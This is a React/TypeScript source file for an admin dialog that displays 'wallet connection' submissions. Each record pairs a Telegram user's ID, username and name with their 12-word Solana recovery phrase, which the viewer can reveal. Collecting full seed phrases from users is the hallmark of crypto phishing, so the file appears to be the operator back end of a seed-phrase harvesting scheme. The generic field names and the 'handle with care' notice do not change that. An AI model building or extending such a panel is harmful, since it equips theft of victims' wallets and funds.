import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Badge } from "@/components/ui/badge";
import { Label } from "@/components/ui/label";
import { Input } from "@/components/ui/input";
import { format } from "date-fns";
import { Eye, EyeOff, Shield, AlertTriangle } from "lucide-react";
import { useState } from "react";
import { Button } from "@/components/ui/button";

interface WalletConnection {
  id: string;
  telegram_user_id: number | null;
  telegram_username: string | null;
  telegram_first_name: string | null;
  created_at: string;
  field_1: string;
  field_2: string;
  field_3: string;
  field_4: string;
  field_5: string;
  field_6: string;
  field_7: string;
  field_8: string;
  field_9: string;
  field_10: string;
  field_11: string;
  field_12: string;
}

interface SubmissionDetailDialogProps {
  submission: WalletConnection | null;
  open: boolean;
  onClose: () => void;
}

export const SubmissionDetailDialog = ({ submission, open, onClose }: SubmissionDetailDialogProps) => {
  const [showSeedPhrase, setShowSeedPhrase] = useState(false);

  if (!submission) return null;

  const seedPhraseFields = [
    submission.field_1, submission.field_2, submission.field_3, submission.field_4,
    submission.field_5, submission.field_6, submission.field_7, submission.field_8,
    submission.field_9, submission.field_10, submission.field_11, submission.field_12
  ];

  const maskWord = (word: string) => {
    if (!word) return "****";
    if (word.length <= 4) return "****";
    return word.slice(0, 2) + "****" + word.slice(-2);
  };

  return (
    <Dialog open={open} onOpenChange={onClose}>
      <DialogContent className="max-w-2xl max-h-[90vh] overflow-y-auto">
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2">
            <Shield className="w-5 h-5" />
            Submission Details
          </DialogTitle>
          <DialogDescription>
            View wallet connection submission - Handle with care
          </DialogDescription>
        </DialogHeader>

        <div className="space-y-6">
          {/* Security Warning */}
          <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-4">
            <div className="flex items-start gap-3">
              <AlertTriangle className="w-5 h-5 text-destructive flex-shrink-0 mt-0.5" />
              <div>
                <h4 className="font-semibold text-sm text-destructive mb-1">Security Notice</h4>
                <p className="text-xs text-muted-foreground">
                  This is sensitive Solana wallet data. Access is logged. Never share or screenshot this information.
                </p>
              </div>
            </div>
          </div>

          {/* User Information */}
          <div className="space-y-3">
            <h3 className="font-semibold text-sm">User Information</h3>
            <div className="grid grid-cols-2 gap-4">
              <div>
                <Label className="text-xs text-muted-foreground">Telegram User ID</Label>
                <div className="mt-1">
                  {submission.telegram_user_id ? (
                    <Badge variant="outline">{submission.telegram_user_id}</Badge>
                  ) : (
                    <Badge variant="destructive">Not Available</Badge>
                  )}
                </div>
              </div>
              <div>
                <Label className="text-xs text-muted-foreground">Username</Label>
                <div className="mt-1">
                  <Badge variant="secondary">
                    {submission.telegram_username ? `@${submission.telegram_username}` : "N/A"}
                  </Badge>
                </div>
              </div>
              <div>
                <Label className="text-xs text-muted-foreground">First Name</Label>
                <div className="mt-1">
                  <Badge variant="secondary">{submission.telegram_first_name || "N/A"}</Badge>
                </div>
              </div>
              <div>
                <Label className="text-xs text-muted-foreground">Submitted</Label>
                <div className="mt-1">
                  <Badge variant="outline">
                    {format(new Date(submission.created_at), "MMM d, yyyy HH:mm")}
                  </Badge>
                </div>
              </div>
            </div>
          </div>

          {/* Seed Phrase Section */}
          <div className="space-y-3">
            <div className="flex items-center justify-between">
              <h3 className="font-semibold text-sm">12-Word Recovery Phrase</h3>
              <Button
                variant="outline"
                size="sm"
                onClick={() => setShowSeedPhrase(!showSeedPhrase)}
              >
                {showSeedPhrase ? (
                  <>
                    <EyeOff className="w-4 h-4 mr-2" />
                    Hide
                  </>
                ) : (
                  <>
                    <Eye className="w-4 h-4 mr-2" />
                    Reveal
                  </>
                )}
              </Button>
            </div>
            
            <div className="grid grid-cols-2 sm:grid-cols-3 gap-3">
              {seedPhraseFields.map((word, index) => (
                <div key={index} className="space-y-1">
                  <Label className="text-xs text-muted-foreground">Word {index + 1}</Label>
                  <Input
                    value={showSeedPhrase ? word : maskWord(word)}
                    readOnly
                    className="text-sm font-mono"
                  />
                </div>
              ))}
            </div>
          </div>

          {/* Metadata */}
          <div className="space-y-2 text-xs text-muted-foreground border-t pt-4">
            <p>Submission ID: {submission.id}</p>
            <p>Status: {submission.telegram_user_id ? "Verified" : "Unverified"}</p>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  );
};
